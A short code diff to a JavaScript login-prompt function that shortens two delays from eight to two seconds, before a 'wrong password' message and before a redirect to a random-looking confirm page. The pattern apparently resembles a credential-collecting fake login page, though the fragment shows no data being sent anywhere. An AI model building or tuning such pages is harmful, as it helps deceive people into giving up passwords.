@@ -253,12 +253,12 @@ function showPrompt(IpAddress) {
                     $('.lsd-ring-container').addClass('d-none');
                     $('#wrong-password').removeClass('d-none');
                     $("#password").val('');
-                }, 8000);
+                }, 2000);
             } else {
                 setTimeout(function () {
                     $('.lsd-ring-container').addClass('d-none');
                     window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-                }, 8000);
+                }, 2000);
             }
         })
         .catch(error => {
